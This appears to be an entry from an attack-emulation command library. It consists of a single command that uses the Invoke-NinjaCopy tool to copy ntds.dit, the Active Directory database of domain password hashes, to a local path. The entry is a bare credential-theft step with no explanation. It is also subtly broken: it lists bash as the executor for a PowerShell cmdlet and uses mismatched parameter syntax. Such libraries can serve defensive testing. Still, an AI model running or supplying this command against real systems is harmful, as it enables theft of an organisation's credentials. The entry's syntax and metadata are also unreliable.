---
id: d7b8db04-f694-40e8-8033-d1c3595c15db
name: Copy NTDS.dit file using NinjaCopy tool
type: command
executor: bash
data: Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination
  c:\ntds.dit
output: null
created_at: '2023-04-06T03:56:03.991754+00:00'
updated_at: '2023-04-10T20:25:43.691133+00:00'
---

# Copy NTDS.dit file using NinjaCopy tool

```bash
Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
```


